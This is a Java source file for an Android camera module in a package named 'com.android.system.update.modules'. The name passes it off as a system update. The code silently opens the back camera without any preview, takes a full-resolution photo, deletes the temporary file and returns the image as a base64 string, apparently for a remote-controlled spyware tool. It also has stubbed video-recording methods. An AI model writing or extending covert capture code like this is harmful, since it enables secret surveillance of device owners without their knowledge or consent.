package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import android.graphics.ImageFormat;
import android.os.Looper;
import android.util.Log;
import java.util.Arrays; // ADD THIS IMPORT
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private Context context;
    private CameraManager cameraManager;
    private String cameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private Handler mainHandler;
    
    public CameraModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        startBackgroundThread();
        
        // Get back camera by default
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera ID", e);
        }
    }
    public String takePhoto() {
    Log.d(TAG, "📸 takePhoto() called");
    if (!checkPermission()) {
        Log.e(TAG, "❌ No camera permission");
        return "ERROR: No camera permission";
    }
    
    Log.d(TAG, "Starting photo capture with cameraId: " + cameraId);
    
    try {
        // Log temp file creation
        File photoFile = File.createTempFile("photo", ".jpg", 
            context.getExternalFilesDir(null));
        Log.d(TAG, "📁 Temp file created: " + photoFile.getAbsolutePath());
        
        // Create a latch to wait for the photo to be captured
        CountDownLatch latch = new CountDownLatch(1);
        AtomicReference<String> result = new AtomicReference<>("ERROR: Timeout");
        
        // Open camera and capture on background thread
        backgroundHandler.post(() -> {
            try {
                Log.d(TAG, "🔄 Starting capture on background thread");
                capturePhotoSync(photoFile, latch, result);
            } catch (Exception e) {
                Log.e(TAG, "❌ Error in capture thread", e);
                result.set("ERROR: " + e.getMessage());
                latch.countDown();
            }
        });
        
        Log.d(TAG, "⏳ Waiting for capture to complete...");
        // Wait for capture to complete (max 15 seconds)
        if (latch.await(15000, TimeUnit.MILLISECONDS)) {
            String photoResult = result.get();
            Log.d(TAG, "✅ Capture completed with result: " + photoResult);
            
            // Check if file exists and has content
            if (photoFile.exists()) {
                long fileSize = photoFile.length();
                Log.d(TAG, "📁 File exists, size: " + fileSize + " bytes");
                
                if (fileSize > 0) {
                    try {
                        byte[] bytes = readFileToBytes(photoFile);
                        Log.d(TAG, "📸 Read " + bytes.length + " bytes from file");
                        
                        if (bytes.length > 0) {
                            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
                            Log.d(TAG, "✅ Base64 encoded, length: " + base64.length());
                            
                            // Clean up the file
                            photoFile.delete();
                            Log.d(TAG, "📁 Temp file deleted");
                            
                            return "data:image/jpeg;base64," + base64;
                        } else {
                            Log.e(TAG, "❌ Captured photo is empty");
                            return "ERROR: Captured photo is empty";
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error reading photo file", e);
                        return "ERROR: Failed to read photo: " + e.getMessage();
                    }
                } else {
                    Log.e(TAG, "❌ Photo file is empty");
                    return "ERROR: Photo file is empty";
                }
            } else {
                Log.e(TAG, "❌ Photo file does not exist");
                return "ERROR: Photo file not created";
            }
        } else {
            Log.e(TAG, "❌ Camera timeout - took too long to capture");
            return "ERROR: Camera timeout - took too long to capture";
        }
        
    } catch (Exception e) {
        Log.e(TAG, "❌ Error taking photo", e);
        return "ERROR: " + e.getMessage();
    }
}

    // Add a test method
public String testCamera() {
    Log.d(TAG, "🔧 Testing camera module");
    if (!checkPermission()) {
        return "ERROR: No camera permission";
    }
    
    try {
        String[] cameraIds = cameraManager.getCameraIdList();
        Log.d(TAG, "Available cameras: " + Arrays.toString(cameraIds));
        
        if (cameraId == null) {
            return "ERROR: No back camera found";
        }
        
        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
        return "SUCCESS: Camera " + cameraId + " is available";
    } catch (Exception e) {
        Log.e(TAG, "❌ Camera test failed", e);
        return "ERROR: " + e.getMessage();
    }
}

    private void capturePhotoSync(File photoFile, CountDownLatch latch, AtomicReference<String> result) {
    CameraDevice cameraDevice = null;
    ImageReader imageReader = null;
    CameraCaptureSession captureSession = null;
    
    try {
        Log.d(TAG, "📸 capturePhotoSync started");
        
        // Get the largest size
        Size largest = getLargestSize();
        Log.d(TAG, "📐 Using size: " + largest.getWidth() + "x" + largest.getHeight());
        
        // Create ImageReader
        imageReader = ImageReader.newInstance(largest.getWidth(), 
            largest.getHeight(), ImageFormat.JPEG, 2);
        Log.d(TAG, "🖼️ ImageReader created");
        
        // Set up the ImageAvailableListener
        imageReader.setOnImageAvailableListener(reader -> {
            Log.d(TAG, "📸 Image available listener triggered");
            try (Image image = reader.acquireLatestImage()) {
                if (image == null) {
                    Log.e(TAG, "❌ Acquired image is null");
                    return;
                }
                
                Log.d(TAG, "📸 Image acquired, format: " + image.getFormat() + 
                      ", size: " + image.getWidth() + "x" + image.getHeight());
                
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                
                Log.d(TAG, "📸 Image bytes read: " + bytes.length);
                
                // Write to file
                try (FileOutputStream fos = new FileOutputStream(photoFile)) {
                    fos.write(bytes);
                    fos.flush();
                    Log.d(TAG, "✅ Photo saved: " + photoFile.getAbsolutePath() + 
                          " size: " + bytes.length + " bytes");
                    result.set("SUCCESS");
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error saving photo", e);
                    result.set("ERROR: Failed to save: " + e.getMessage());
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error processing image", e);
                result.set("ERROR: " + e.getMessage());
            } finally {
                Log.d(TAG, "🔽 Signaling latch from ImageAvailableListener");
                latch.countDown();
            }
        }, backgroundHandler);
        
        // Open camera synchronously
        Log.d(TAG, "🔓 Opening camera: " + cameraId);
        CountDownLatch openLatch = new CountDownLatch(1);
        AtomicReference<CameraDevice> deviceRef = new AtomicReference<>();
        AtomicReference<String> openError = new AtomicReference<>();
        
        cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
            @Override
            public void onOpened(CameraDevice device) {
                Log.d(TAG, "✅ Camera opened successfully");
                deviceRef.set(device);
                openLatch.countDown();
            }
            
            @Override
            public void onDisconnected(CameraDevice device) {
                Log.w(TAG, "⚠️ Camera disconnected");
                device.close();
                openError.set("Camera disconnected");
                openLatch.countDown();
            }
            
            @Override
            public void onError(CameraDevice device, int error) {
                Log.e(TAG, "❌ Camera error: " + error);
                device.close();
                openError.set("Camera error: " + error);
                openLatch.countDown();
            }
        }, backgroundHandler);
        
        // Wait for camera to open
        if (!openLatch.await(5000, TimeUnit.MILLISECONDS)) {
            Log.e(TAG, "❌ Camera open timeout");
            result.set("ERROR: Camera open timeout");
            latch.countDown();
            return;
        }
        
        if (openError.get() != null) {
            Log.e(TAG, "❌ Camera open error: " + openError.get());
            result.set("ERROR: " + openError.get());
            latch.countDown();
            return;
        }
        
        cameraDevice = deviceRef.get();
        if (cameraDevice == null) {
            Log.e(TAG, "❌ Camera device is null");
            result.set("ERROR: Camera device is null");
            latch.countDown();
            return;
        }
        
        // Create capture session
        Log.d(TAG, "🔧 Creating capture session");
        CountDownLatch sessionLatch = new CountDownLatch(1);
        AtomicReference<CameraCaptureSession> sessionRef = new AtomicReference<>();
        AtomicReference<String> sessionError = new AtomicReference<>();
        
        cameraDevice.createCaptureSession(
            java.util.Collections.singletonList(imageReader.getSurface()),
            new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession session) {
                    Log.d(TAG, "✅ Capture session configured");
                    sessionRef.set(session);
                    sessionLatch.countDown();
                }
                
                @Override
                public void onConfigureFailed(CameraCaptureSession session) {
                    Log.e(TAG, "❌ Capture session configure failed");
                    sessionError.set("Session configure failed");
                    sessionLatch.countDown();
                }
            }, backgroundHandler
        );
        
        // Wait for session to be configured
        if (!sessionLatch.await(5000, TimeUnit.MILLISECONDS)) {
            Log.e(TAG, "❌ Session configure timeout");
            result.set("ERROR: Session configure timeout");
            latch.countDown();
            return;
        }
        
        if (sessionError.get() != null) {
            Log.e(TAG, "❌ Session error: " + sessionError.get());
            result.set("ERROR: " + sessionError.get());
            latch.countDown();
            return;
        }
        
        captureSession = sessionRef.get();
        if (captureSession == null) {
            Log.e(TAG, "❌ Capture session is null");
            result.set("ERROR: Capture session is null");
            latch.countDown();
            return;
        }
        
        // Create capture request
        Log.d(TAG, "📸 Creating capture request");
        CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(
            CameraDevice.TEMPLATE_STILL_CAPTURE);
        builder.addTarget(imageReader.getSurface());
        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
        
        // Set auto-focus if available
        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
        int[] afModes = chars.get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES);
        if (afModes != null && afModes.length > 0) {
            builder.set(CaptureRequest.CONTROL_AF_MODE, 
                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            Log.d(TAG, "🔍 Auto-focus enabled");
        }
        
        // Capture
        Log.d(TAG, "📸 Capturing...");
        CountDownLatch captureLatch = new CountDownLatch(1);
        captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
            @Override
            public void onCaptureStarted(CameraCaptureSession session, 
                    CaptureRequest request, long timestamp, long frameNumber) {
                Log.d(TAG, "📸 Capture started at timestamp: " + timestamp);
            }
            
            @Override
            public void onCaptureCompleted(CameraCaptureSession session, 
                    CaptureRequest request, TotalCaptureResult result) {
                Log.d(TAG, "✅ Capture completed");
                captureLatch.countDown();
            }
            
            @Override
            public void onCaptureFailed(CameraCaptureSession session, 
                    CaptureRequest request, CaptureFailure failure) {
                Log.e(TAG, "❌ Capture failed: " + failure.getReason());
                result.set("ERROR: Capture failed");
                captureLatch.countDown();
            }
        }, backgroundHandler);
        
        // Wait for capture to complete
        if (!captureLatch.await(5000, TimeUnit.MILLISECONDS)) {
            Log.e(TAG, "❌ Capture timeout");
            result.set("ERROR: Capture timeout");
            latch.countDown();
            return;
        }
        
        Log.d(TAG, "✅ Capture process completed, waiting for image...");
        // Give time for the image listener to process
        Thread.sleep(1000);
        
    } catch (Exception e) {
        Log.e(TAG, "❌ Error in captureSync", e);
        result.set("ERROR: " + e.getMessage());
        latch.countDown();
    } finally {
        // Clean up properly
        Log.d(TAG, "🧹 Cleaning up camera resources");
        try {
            if (captureSession != null) {
                captureSession.close();
                Log.d(TAG, "✅ Capture session closed");
            }
            if (imageReader != null) {
                imageReader.close();
                Log.d(TAG, "✅ ImageReader closed");
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                Log.d(TAG, "✅ Camera device closed");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error closing camera resources", e);
        }
    }
}
    private byte[] readFileToBytes(File file) throws Exception {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            return bytes;
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        // Recording implementation would go here
        Log.d(TAG, "Recording started (stub)");
    }
    
    public String stopRecording() {
        Log.d(TAG, "Recording stopped (stub)");
        return "Recording stopped";
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) {
                return new Size(1920, 1080);
            }
            
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                return new Size(1920, 1080);
            }
            
            Size largest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() > largest.getWidth()) {
                    largest = size;
                }
            }
            return largest;
        } catch (Exception e) {
            Log.e(TAG, "Error getting largest size", e);
            return new Size(1920, 1080);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
}
